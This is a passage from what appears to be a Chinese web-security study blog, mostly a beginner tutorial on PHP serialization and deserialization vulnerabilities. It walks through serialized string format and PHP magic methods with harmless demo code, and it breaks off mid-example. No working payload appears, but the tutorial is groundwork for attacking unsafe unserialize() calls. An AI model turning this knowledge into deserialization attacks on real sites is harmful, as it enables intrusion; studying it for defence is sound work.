将用户加入管理员组</span><br></pre></td></tr></table></figure>\n\n","categories":["web安全学习"],"tags":["内网","web","安全"]},{"title":"反序列化从入门到入土","url":"/2022/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/","content":"<h2 id=\"序列化的概念\"><a href=\"#序列化的概念\" class=\"headerlink\" title=\"序列化的概念\"></a>序列化的概念</h2><p>官方话：将对象或数组转换为可存储的字符串</p>\n<p>我的理解：游戏的存档</p>\n<p>在PHP中我们会使用<code>serialize()</code>函数来序列化对象或数组，将其转换为可存储的字符串</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&quot;monkey&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$age</span> = <span class=\"number\">20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span> -&gt; name; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 实例化对象 </span></span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 序列化对象 </span></span><br><span class=\"line\"><span class=\"variable\">$se</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$test</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 返回序列化后的结果 </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"variable\">$se</span>);</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>返回的结果：</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">string(75) &quot;O:4:&quot;Test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;monkey&quot;;s:6:&quot;\\000*\\000age&quot;;i:20;s:7:&quot;\\000Test\\000a&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>O:4:&quot;Test&quot;:3</code>：O表示的是对象类型；4是对象名称的长度；Test是对象名；3表示该对象中的属性个数</li>\n<li><code>s:4:&quot;name&quot;;s:6:&quot;monkey&quot;</code>：前面的s表示变量名称是字符串类型；name是变量的名称；后面的s表示变量值是字符串类型；monkey表示变量值。</li>\n<li><code>s:6:&quot;\\000*\\000age&quot;;i:20</code>：这里为什么是6呢？而且还多了两个<code>\\000</code>，这是因为这里成员变量使用的是<code>protected</code>，protected属性序列化的时候格式是 %00%00成员名；后面的i表示的是整数型。</li>\n<li><code>s:7:&quot;\\000Test\\000a&quot;;b:0</code>：成员变量使用的属性是<code>private</code>，private属性序列化的时候格式是<code>%00类名%00成员名</code>；b表示的布尔类型。</li>\n<li>这里只有属性，没有方法，这是因为序列化函数只对类的属性进行序列化，不对方法进行序列化。</li>\n</ul>\n<h2 id=\"反序列化的概念\"><a href=\"#反序列化的概念\" class=\"headerlink\" title=\"反序列化的概念\"></a>反序列化的概念</h2><p>官方话：将序列化后的字符串转换回对象或者数组。</p>\n<p>我的理解：游戏的读档。</p>\n<p>在PHP中我们使用unserialize()函数来将序列化后的字符串转换回PHP的值。</p>\n<p>然后我们构造反序列化的代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"string\">&#x27;O:4:&quot;Test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;monkey&quot;;s:6:&quot; * age&quot;;i:20;s:7:&quot; Test a&quot;;b:0;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$b</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span> -&gt; name;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-5-1024x544.png\" alt=\"img\"></p>\n<p>这里并不是打印了类的对象和成员变量name的值，因为在反序列化的时候要保证有该类存在，因为序列化是不序列化方法的，所以反序列化的时候还要依靠该类进行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&quot;monkey&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$age</span> = <span class=\"number\">20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$a</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    \t<span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span> -&gt; name; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"string\">&#x27;O:4:&quot;Test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;monkey&quot;;s:6:&quot; * age&quot;;i:20;s:7:&quot; Test a&quot;;b:0;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$b</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$b</span> -&gt; name;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-6-1024x546.png\" alt=\"img\"></p>\n<h2 id=\"反序列化漏洞的产生\"><a href=\"#反序列化漏洞的产生\" class=\"headerlink\" title=\"反序列化漏洞的产生\"></a>反序列化漏洞的产生</h2><p>反序列化漏洞其实就是由于<code>unserialize</code>函数接收到了用户传入的恶意的序列化数据篡改了成员属性而导致的漏洞。</p>\n<h2 id=\"魔术方法\"><a href=\"#魔术方法\" class=\"headerlink\" title=\"魔术方法\"></a>魔术方法</h2><ul>\n<li>__construct()，类的构造函数</li>\n<li>__destruct()，类的析构函数</li>\n<li>__call()，在对象中调用一个不可访问方法时调用</li>\n<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>\n<li>__get()，获得一个类的成员变量时调用</li>\n<li>__set()，设置一个类的成员变量时调用</li>\n<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>\n<li>__unset()，当对不可访问属性调用unset()时被调用。</li>\n<li>__sleep()，执行serialize()时，先会调用这个函数</li>\n<li>__wakeup()，执行unserialize()时，先会调用这个函数</li>\n<li>__toString()，类被当成字符串时的回应方法</li>\n<li>__invoke()，调用函数的方式调用一个对象时的回应方法</li>\n<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>\n<li>__clone()，当对象复制完成时调用</li>\n<li>__autoload()，尝试加载未定义的类</li>\n<li>__debugInfo()，打印所需调试信息</li>\n</ul>\n<h4 id=\"魔术方法详解\"><a href=\"#魔术方法详解\" class=\"headerlink\" title=\"魔术方法详解\"></a>魔术方法详解</h4><p>__construct()：该方法被称为构造方法。就是当一个对象被实例化的时候，首先会去执行的方法，但是在序列化和反序列化的时候是不会去触发的。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>) </span>&#123;</span><br><span class=\"line\">    \t<span class=\"variable language_\">$this</span> -&gt; name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;__construct is OK&quot;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>(<span class=\"string\">&#x27;monkey&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$se</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$test</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$se</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-7-1024x118.png\" alt=\"img\"></p>\n<p>__destruct()：当某个对象的所有引用都被删除或者对象被销毁的时候执行的魔术方法。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __destruct() method. </span></span><br><span class=\"line\">    \t<span class=\"keyword\">echo</span> <span class=\"string\">&quot;__destruct is OK&quot;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"><span class=\"variable\">$se</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$test</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$se</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-8-1024x103.png\" alt=\"img\"></p>\n<p>这里触发了两次是因为第一次实例化的时候会触发一次，另外一次就是反序列化后生成的对象触发的。</p>\n<p>__call()：在对象中调用不可访问方法时会调用<code>__call()</code>魔术方法。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"comment\">// $arguments变量是一个数组 </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$arguments</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __call() method. </span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">$name</span>,<span class=\"subst\">$arguments</span>[0]&quot;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"><span class=\"variable\">$test</span> -&gt; <span class=\"title function_ invoke__\">test</span>(<span class=\"string\">&#x27;123&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-9-1024x109.png\" alt=\"img\"></p>\n<p>__callStatic()：在静态上下文中调用一个不可访问方法时会被调用。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"comment\">// $arguments是一个数组 </span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__callStatic</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$arguments</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __callStatic() method. </span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">$name</span>,<span class=\"subst\">$arguments</span>[0]&quot;</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"><span class=\"comment\">/* * 双冒号也叫范围解析操作符，可以用于访问静态成员、类常量，还可以用于覆盖类中的属性和方法。 */</span> </span><br><span class=\"line\"><span class=\"variable\">$test</span>::<span class=\"title function_ invoke__\">test</span>(<span class=\"string\">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-10-1024x104.png\" alt=\"img\"></p>\n<p>__get()：读取不可访问属性的值时调用。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __get() method. </span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$name</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>(); </span><br><span class=\"line\"><span class=\"variable\">$test</span> -&gt; age;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-11-1024x107.png\" alt=\"img\"></p>\n<p>__set()：给不可访问的属性赋值时会调用。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__set</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$value</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __set() method. </span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$name</span>.<span class=\"string\">&quot;,&quot;</span>.<span class=\"variable\">$value</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>(); </span><br><span class=\"line\"><span class=\"variable\">$test</span> -&gt; age = <span class=\"number\">18</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-12-1024x111.png\" alt=\"img\"></p>\n<p>__set和__get是不一样的，一个只是访问，一个是要进行赋值。</p>\n<p>__isset()：对不可访问属性（属性是private或者不存在）调用isset()或者empty()时调用。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __isset() method.</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$name</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"><span class=\"keyword\">isset</span>(<span class=\"variable\">$test</span> -&gt; age);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-13-1024x114.png\" alt=\"img\"></p>\n<p>__unset()：对不可访问的属性调用unset()时会调用。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__unset</span>(<span class=\"params\"><span class=\"variable\">$name</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __unset() method. </span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$name</span>; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"><span class=\"keyword\">unset</span>(<span class=\"variable\">$test</span> -&gt; age);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-14-1024x109.png\" alt=\"img\"></p>\n<p>__sleep()：serialize()函数会检查是否存在__sleep()魔术方法，如果存在，该方法会先被调用，然后才执行序列化操作。此功能用于清理对象，并返回一个包含对象中所有被序列化的变量名称的数组。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"variable constant_\">SITE</span> = <span class=\"string\">&#x27;name&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$age</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$pass</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$age</span>, <span class=\"variable\">$pass</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; age = <span class=\"variable\">$age</span>; </span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; pass = <span class=\"variable\">$pass</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __sleep() method.</span></span><br><span class=\"line\">        <span class=\"comment\">// 返回需要序列化的变量名，过滤了pass变量 </span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;name&#x27;</span>,<span class=\"string\">&#x27;age&#x27;</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>(<span class=\"string\">&#x27;monkey&#x27;</span>,<span class=\"number\">18</span>, <span class=\"string\">&#x27;pass&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$test</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-16-1024x118.png\" alt=\"img\"></p>\n<p>__wakeup()：unserialize()函数会先检查是否存在__wakeup()魔术方法，存在则会先调用__wakeup()魔术方法。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"variable constant_\">SITE</span> = <span class=\"string\">&#x27;name&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$age</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$pass</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$age</span>, <span class=\"variable\">$pass</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; age = <span class=\"variable\">$age</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; pass = <span class=\"variable\">$pass</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __wakeup() method. </span></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span> -&gt; pass = <span class=\"variable language_\">$this</span> -&gt; name; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"string\">&#x27;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;monkey&quot;;s:3:&quot;age&quot;;i:18;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$test</span>));</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-17-1024x111.png\" alt=\"img\"></p>\n<p>__toString()：用于一个类被当做字符串时做出回应。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __toString() method.</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;__toString is OK&#x27;</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"variable\">$test</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Test</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$test</span>;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-18-1024x109.png\" alt=\"img\"></p>\n<p>__toString()的触发方法：</p>\n<ol>\n<li><code>echo $obj</code>&#x2F;<code>print($obj)</code>时会触发</li>\n<li>反序列化对象和字符串拼接的时候会触发</li>\n<li>反序列化对象参与格式化字符串时触发</li>\n<li>反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型）</li>\n<li>反序列化对象参与格式化SQL语句，绑定参数时（这个暂时还不太理解）</li>\n<li>反序列化对象在经过php字符串处理函数触发</li>\n<li>在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用</li>\n<li>反序列化的对象作为class_exists()的参数的时候</li>\n</ol>\n<p>__invoke()：当对象被当成函数调用的时候，__invoke()会被触发（适用版本：PHP&gt;5.1.0）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"comment\">// 定义一个类 </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Test</span></span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>; </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// <span class=\"doctag\">TODO:</span> Implement __invoke() method. </span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;__invoke 